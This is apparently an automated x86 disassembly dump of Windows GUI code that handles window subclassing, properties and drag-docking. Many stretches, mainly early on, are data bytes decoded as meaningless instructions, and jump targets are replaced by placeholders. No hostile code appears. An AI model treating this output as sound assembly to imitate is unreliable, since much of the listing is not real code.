mov esp 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp [ ecx - 0x4405ffbc ] 0x44
add bh bh
jmp [ eax + 0x44b8 ]
sub_44c0f8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
rol [ eax + eax + 0x28 ] 0x0
add [ eax ] al
mov al 0x10
inc eax
add al ah
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0x9004032 ] ah
push esp
inc esp
outsd
arpl [ ebx + 0x5a ] bp
outsd
outsb
mov eax eax
int3
sub_44c1e8
enter 0x44c1 0x0
rol cl cl
inc esp
add ah bl
rol [ eax + eax + 0x4d ] 0xc1
inc esp
add [ ebp - 0x3f ] dl
inc esp
add [ ebp - 0x3f ] bl
inc esp
add [ ebp - 0x3f ] ah
inc esp
add [ edx - 0x3f ] dh
inc esp
add [ edi - 0x3f ] bh
inc esp
add [ ecx + eax * 8 - 0x3e66ffbc ] cl
inc esp
add [ esi - 0x4cffbb3f ] ah
rol [ eax + eax - 0x40 ] 0xc1
inc esp
add [ ecx ] al
add [ eax ] al
add [ ecx - 0x3 ] bh
sbb [ esi + 0x11d1c281 ] eax
stosb [ edi ]
pushad
add al al
dec edi
mov [ 0xffffffffc1e8e870 ] eax
inc esp
add [ eax + eax ] dh
add [ eax ] al
add [ eax ] al
add [ edx + eax * 8 - 0x3ddfffbc ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x780044c2 ] bh
add [ eax ] al
add [ ecx + edx + 0x34e00040 ] ah
inc eax
add ah al
pop ecx
inc eax
add al dl
pop ecx
inc eax
add ah dh
xor al 0x40
add al ch
xor al 0x40
add al ah
pop ecx
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax - 0x7a ] bh
inc ebp
add ah cl
xchg [ ebp ] al
inc esp
mov [ ebp ] al
push esp
mov [ ebp ] al
adc al 0x90
inc ebp
add ah bh
xchg edx eax
inc ebp
add [ edx * 4 - 0x68bfffbb ] bh
inc ebp
add [ esp + ebx * 4 + 0x45 ] al
add al bh
cdq
inc ebp
add [ eax ] dl
test [ ebp ] eax
fcom [ ebx + 0x54090045 ]
inc esp
outsd
arpl [ ebx + 0x54 ] bp
jb r-xdata
add [ eax ] al
insb
les eax [ eax + eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + eax * 8 + 0x44 ] dl
add [ eax ] cl
add al [ eax ]
add [ eax + edi * 4 + 0x44 ] dl
add al ah
sbb al [ edx ]
in al dx
xor al 0x40
add [ esp + edx ] dh
inc edx
add ah dh
xor al 0x40
add ah cl
cmp eax [ ebp ]
dec eax
xor al [ eax ]
xor al [ fs : eax ]
movsb [ edi ] [ esi ]
push ds
inc ebp
add [ ebx + ebp * 2 + 0x45 ] ch
add [ ebx + esi - 0x7053ffbb ] dl
inc ecx
add [ eax ] ch
sbb [ ebp ] eax
and al 0xed
inc esp
add [ eax + 0x20 ] cl
inc ebp
add [ esi + esi * 8 ] bh
inc esp
add al bh
sbb al [ edx ]
loopne r-xdata
mov eax eax
adc bl al
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
retn
push 0x45
add [ eax - 0x3ffbb15 ] bl
pushad
inc ebp
add [ ecx ] bl
inc ebp
add [ esi + ebx * 2 ] dh
inc ebp
add al ah
0xeae40044 0x44
inc edx
add al bl
pop ss
inc edx
add [ eax ] al
sbb eax [ edx ]
sbb [ 0x66800045 ] 0x45
add [ ebx + ebp * 2 + 0x6ae80045 ] bl
inc ebp
sub_44c31c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
les eax [ eax + eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + eax * 8 + 0x44 ] dl
add [ eax ] cl
add al [ eax ]
add [ eax + edi * 4 + 0x44 ] dl
add al ah
sbb al [ edx ]
in al dx
xor al 0x40
add [ esp + edx ] dh
inc edx
add ah dh
xor al 0x40
add ah cl
cmp eax [ ebp ]
dec eax
xor al [ eax ]
xor al [ fs : eax ]
movsb [ edi ] [ esi ]
push ds
inc ebp
add [ ebx + ebp * 2 + 0x45 ] ch
add [ ebx + esi - 0x7053ffbb ] dl
inc ecx
add [ eax ] ch
sbb [ ebp ] eax
and al 0xed
inc esp
add [ eax + 0x20 ] cl
inc ebp
add [ esi + esi * 8 ] bh
inc esp
add al bh
sbb al [ edx ]
loopne r-xdata
push 0x45
add [ eax - 0x3ffbb15 ] bl
pushad
inc ebp
add [ ecx ] bl
inc ebp
add [ esi + ebx * 2 ] dh
inc ebp
add al ah
0xeae40044 0x44
inc edx
add al bl
pop ss
inc edx
add [ eax ] al
sbb eax [ edx ]
sbb [ 0x66800045 ] 0x45
add [ ebx + ebp * 2 + 0x6ae80045 ] bl
inc ebp
sub_44c3b8
clc
sbb al [ ebp ]
and al 0x1b
inc ebp
add [ esi + esi * 8 ] ah
inc esp
add [ esp + ebp * 8 + 0x44 ] bl
add [ eax + 0x280044f7 ] dh
test [ eax + eax + 0x3c ] 0xe80044fa
clc
inc esp
add [ eax + 0x3a ] ch
inc ebp
add [ eax - 0x77ffbae5 ] ch
pop esi
inc ebp
add [ edi + ebx * 2 + 0x45 ] al
add [ eax + 0x5a ] al
inc ebp
add [ eax ] ch
pop edi
inc ebp
add al al
and [ ebp ] al
push esp
daa
inc ebp
add ah dh
xor al 0x45
add al ah
inc ebp
add ah bl
xor [ ebp ] eax
or al 0x30
inc ebp
add [ ebp + esi + 0x35900045 ] cl
inc ebp
add [ eax + 0x34 ] cl
inc ebp
add al dh
xor eax [ ebp ]
push 0x38004560
inc ebp
add [ edx + esi * 2 + 0x45 ] bl
add ah ah
pop esp
inc ebp
add ah dl
pop edi
inc ebp
add ah ch
sub al [ eax ]
in al dx
sub al [ eax ]
in al dx
sub al [ eax ]
in al dx
sub al [ eax ]
in al dx
sub al [ eax ]
in al dx
sub al [ eax ]
in al dx
sub al [ eax ]
in al dx
sub al [ eax ]
cmp al 0xb0
inc ebp
add ah ch
sub al [ eax ]
adc dl [ ebx + eax * 2 + 0x75 ]
jae r-xdata
inc edx
add ah dh
xor al 0x40
add ah cl
outsd
insd
dec esp
imul esi [ ebx + 0x74 ] 0x746e6f43
jb r-xdata
push 0x45
add [ eax - 0x3ffbb15 ] bl
pushad
inc ebp
add [ ecx ] bl
inc ebp
add [ esi + ebx * 2 ] dh
inc ebp
add al ah
0xeae40044 0x44
inc edx
add al bl
pop ss
inc edx
add [ eax ] al
sbb eax [ edx ]
sbb [ 0x66800045 ] 0x45
add [ ebx + ebp * 2 + 0x6ae80045 ] bl
inc ebp
cmp eax [ ebp ]
dec eax
xor al [ eax ]
xor al [ fs : eax ]
movsb [ edi ] [ esi ]
push ds
inc ebp
add [ ebx + ebp * 2 + 0x45 ] ch
insb
nop
insb
les eax [ eax + eax + 0x7 ]
adc dl [ ebx + eax * 2 + 0x75 ]
jae r-xdata
add [ ebx + esi - 0x7053ffbb ] dl
outsd
insd
dec esp
imul esi [ ebx + 0x74 ] 0x746e6f43
jb r-xdata
inc ecx
add [ eax ] ch
sbb [ ebp ] eax
and al 0xed
inc esp
add [ eax + 0x20 ] cl
inc ebp
add [ esi + esi * 8 ] bh
inc esp
add al bh
sbb al [ edx ]
loopne r-xdata
insb
retn
sub_44c648
push ebp
mov ebp esp
push ecx
push ebx
lea ebx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x180 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x18c ]
push eax
push 0xfffffffc
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
push 0xfffffff0
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov [ rw-data ] 0x0
call [ eax + 0x18c ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
pop ebx
pop ecx
pop ebp
retn 0x10
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
sub_44c700
push ebx
push ecx
mov ebx eax
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
xor eax eax
pop edx
pop ebx
retn
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push ebx
call SendMessageA
pop edx
pop ebx
retn
sub_44c734
push ebx
push esi
push ecx
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop edx
pop esi
pop ebx
retn
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_40456c
push eax
call GlobalFindAtomA
cmp ax [ rw-data ]
jne r-xdata
mov eax ebx
call sub_44c700
mov esi eax
movzx eax [ rw-data ]
push eax
push ebx
call GetPropA
mov esi eax
jmp r-xdata
sub_44c790
push ebx
push esi
mov ebx [ rw-data ]
mov ebx [ ebx ]
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
push ecx
push edx
push eax
mov eax [ rw-data ]
push esi
call SendMessageA
pop esi
pop ebx
retn
sub_44c974
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40c7b4
mov ebx eax
test ebx ebx
jne r-xdata
push edi
mov ecx ebx
dec ecx
mov edx 0x1
mov eax esi
call sub_4045cc
mov eax edi
mov edx esi
call sub_404100
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44c9b8
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40c7b4
mov ebx eax
test ebx ebx
jne r-xdata
push edi
lea edx [ ebx + 0x1 ]
mov ecx 0x7fffffff
mov eax esi
call sub_4045cc
mov eax edi
mov edx esi
call sub_404100
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44ca24
push ebx
mov ebx eax
call ReleaseCapture
xor eax eax
mov [ rw-data ] eax
test ebx ebx
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_40343c
test al al
jne r-xdata
mov eax ebx
call sub_456054
push eax
call SetCapture
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov [ rw-data ] ebx
mov ebx [ ebx + 0x30 ]
sub_44cad0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
jmp r-xdata
mov edx [ ebx ]
cmp edx [ esi + 0x8 ]
jl r-xdata
mov edx [ ebx ]
mov eax esi
call sub_4189b0
cmp edi [ eax + 0x4 ]
sete al
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
inc [ ebx ]
sub_44cb04
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_456054
mov ebx eax
test eax eax
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov ebx eax
push eax
call GetParent
test eax eax
jne r-xdata
sub_44cb2c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax 0x8
call sub_4026ec
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ ebx ] eax
push ebp
call sub_44cb04
pop ecx
mov edi eax
mov [ ebx + 0x4 ] edi
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax esi
call sub_44cad0
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_418854
mov ecx ebx
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_418a2c
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44cb88
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
call sub_418888
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_4189b0
mov edx 0x8
call sub_40270c
inc esi
dec ebx
jne r-xdata
sub_44cbbc
push ebx
push esi
push edi
push ecx
mov ebx eax
xor edi edi
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax edi
pop edx
pop edi
pop esi
pop ebx
retn
dec eax
jne r-xdata
call GetDesktopWindow
push eax
call GetTopWindow
mov esi eax
jmp r-xdata
xor edx edx
mov eax ebx
call sub_4189b0
mov edi [ eax ]
jmp r-xdata
test edi edi
jne r-xdata
test esi esi
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
call sub_44cad0
test al al
je r-xdata
push 0x2
push esi
call __imp_GetWindow
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ esp ]
mov eax [ eax + edx * 4 ]
mov edi [ eax ]
jmp r-xdata
sub_44cc20
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov ecx [ edx + 0xc ]
mov [ eax + 0xc ] ecx
mov ecx [ edx + 0x10 ]
mov [ eax + 0x10 ] ecx
mov ecx [ edx + 0x14 ]
mov [ eax + 0x14 ] ecx
mov ecx [ edx + 0x18 ]
mov [ eax + 0x18 ] ecx
mov ecx [ edx + 0x20 ]
mov [ eax + 0x20 ] ecx
mov ecx [ edx + 0x24 ]
mov [ eax + 0x24 ] ecx
mov ecx [ edx + 0x28 ]
mov [ eax + 0x28 ] ecx
mov ecx [ edx + 0x2c ]
mov [ eax + 0x2c ] ecx
retn
sub_44cc80
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
mov edx esp
mov eax [ ebx ]
call sub_403200
mov edx esp
mov eax esi
call sub_404310
add esp 0x100
pop esi
pop ebx
retn
sub_44ccbc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44cd86
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x215
jg r-xdata
sub eax 0xbd00
je r-xdata
je r-xdata
mov eax [ ebx + 0x4 ]
sub eax 0x11
je r-xdata
dec eax
je r-xdata
xor eax eax
call sub_44dddc
jmp r-xdata
sub eax 0x200
je r-xdata
mov eax [ rw-data ]
add eax 0xc
call sub_44d764
jmp r-xdata
sub eax 0xa
je r-xdata
cmp [ ebx + 0x4 ] 0x11
jne r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406cdc
lea eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
push eax
call ClientToScreen
lea eax [ ebp - 0xc ]
call sub_44d764
jmp r-xdata
sub eax 0x2
je r-xdata
mov [ ebx + 0xc ] 0x1
xor eax eax
call sub_44dddc
jmp r-xdata
mov eax [ rw-data ]
add eax 0xc
call sub_44d764
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov al 0x1
call sub_44dddc
jmp r-xdata
sub eax 0x3
je r-xdata
jmp r-xdata
sub_44cd8b
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_46f50c
call sub_403ae0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
call sub_44dddc
sub_44cde4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44ce0e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44ce74
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44cc20
mov eax esi
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x38 ]
mov [ ebx + 0x38 ] eax
sub_44cea0
push ebp
mov ebp esp
push ecx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x38 ]
mov si 0xffdd
call sub_4034ac
pop edi
pop esi
pop ecx
pop ebp
retn 0x4
sub_44cecc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov ecx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x38 ]
mov si 0xffdf
call sub_4034ac
xor edx edx
sub_44cf24
push ebx
mov ebx eax
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
call sub_457cbc
sub_44cf44
push ebx
mov ebx eax
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
call sub_457ca4
sub_44cf68
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_44ce50
mov dl 0x1
mov eax [ r-xdata ]
call sub_424a18
mov esi eax
mov [ ebx + 0x40 ] esi
mov edx 0xffffff
xor eax eax
call sub_429f0c
mov edx eax
mov eax esi
call sub_424b94
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_44cfcc
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
mov eax [ esi + 0x40 ]
call sub_4032b0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4032a0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_44cffc
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44ce74
mov eax esi
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov dl [ eax + 0x54 ]
mov [ ebx + 0x54 ] dl
mov edx [ eax + 0x58 ]
mov [ ebx + 0x58 ] edx
mov dl [ eax + 0x6c ]
mov [ ebx + 0x6c ] dl
push esi
lea esi [ eax + 0x44 ]
lea edi [ ebx + 0x44 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
lea esi [ eax + 0x5c ]
lea edi [ ebx + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx [ eax + 0x40 ]
mov eax [ ebx + 0x40 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_44d058
push ebp
mov ebp esp
push esi
push edi
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax [ esi + 0x38 ]
mov si 0xffe5
call sub_4034ac
pop edi
pop esi
pop ebp
retn 0x4
sub_44d07c
push ebx
push esi
mov ebx edx
mov ecx eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov esi eax
mov eax ebx
cdq
xor eax edx
sub eax edx
cmp esi eax
jge r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax ecx
pop esi
pop ebx
retn
sub_44d0a0
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax [ ebx + 0xc ]
mov edx [ esp ]
cmp eax edx
jl r-xdata
sub edx eax
mov ecx [ esp + 0x8 ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_44d07c
mov esi eax
jmp r-xdata
cmp eax [ esp + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ esp + 0x4 ]
cmp eax edx
jl r-xdata
xor esi esi
sub edx eax
mov ecx [ esp + 0xc ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_44d07c
jmp r-xdata
cmp eax [ esp + 0xc ]
jle r-xdata
test esi esi
jne r-xdata
xor eax eax
neg eax
push eax
neg esi
push esi
lea eax [ ebx + 0x44 ]
push eax
call OffsetRect
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_44d15c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov edi ebx
cmp esi [ edi + 0x4 ]
jne r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov edx ebx
cmp esi [ edx + 0x8 ]
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
push [ edi + 0x10 ]
push [ edi + 0xc ]
lea eax [ ebp - 0x10 ]
push eax
call PtInRect
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp esi [ edx ]
jne r-xdata
xor eax eax
mov [ edx + 0x14 ] 0x1
jmp r-xdata
mov [ edi + 0x8 ] esi
or eax 0xffffffff
or eax 0xffffffff
xor ecx ecx
mov [ edx + 0x8 ] ecx
jmp r-xdata
sub_44d1c8
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
add eax 0xfffffff7
call sub_44d618
mov esi eax
mov [ ebp - 0x14 ] esi
push 0x4
push esi
call GetWindow
mov edx [ rw-data ]
mov edx [ edx ]
cmp eax [ edx + 0x30 ]
je r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_44c734
mov esi eax
test esi esi
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi ebx
jmp r-xdata
jmp r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
mov esi eax
mov eax esi
call sub_456054
mov edi eax
mov [ ebp - 0x18 ] edi
cmp edi [ ebp - 0x14 ]
je r-xdata
mov esi eax
mov eax esi
call sub_456054
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
mov edx [ ebp + 0x8 ]
mov esi eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_456054
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call GetWindowRect
mov eax [ ebp + 0x8 ]
add eax 0xfffffff7
push eax
mov eax [ ebp + 0x8 ]
dec eax
push eax
lea ecx [ ebp - 0x3c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax ebx
mov si 0xffbd
call sub_4034ac
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x9 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax - 0x5 ]
mov [ ebp - 0xc ] edx
lea eax [ ebp - 0x1c ]
push eax
push sub_44d15c
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esi eax
mov eax esi
call sub_456054
mov [ ebp - 0x1c ] eax
jmp r-xdata
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
mov eax [ eax + 0xa0 ]
call sub_456054
cmp eax [ ebp - 0x14 ]
je r-xdata
sub_44d360
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_456054
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_456054
push eax
call IsChild
cmp eax 0x1
sbb eax eax
inc eax
pop ebp
retn
sub_44d3a4
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov esi eax
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x10 ] edx
xor eax eax
mov [ ebp - 0x18 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x11
call GetKeyState
test ax 0x8000
setne al
mov edx [ rw-data ]
mov edx [ edx ]
xor al [ edx + 0xb4 ]
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ rw-data ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
inc ebx
xor edi edi
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_44cbbc
mov [ ebp - 0x18 ] eax
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x18 ]
call sub_44d1c8
pop ecx
test al al
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_4189b0
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
call sub_456054
push eax
call IsWindowVisible
test eax eax
je r-xdata
push ebp
call sub_44d360
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xa0 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
mov [ ebp - 0x1 ] 0x1
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0x1 ]
push eax
lea ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
mov si 0xffbd
call sub_4034ac
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_454b84
dec eax
jle r-xdata
push [ ebp - 0x5 ]
push [ ebp - 0x9 ]
lea eax [ ebp - 0x28 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_44cb2c
sub_44d500
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov edi esi
mov edx edi
mov eax [ rw-data ]
call sub_418a0c
test bl bl
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
inc eax
jne r-xdata
mov edx eax
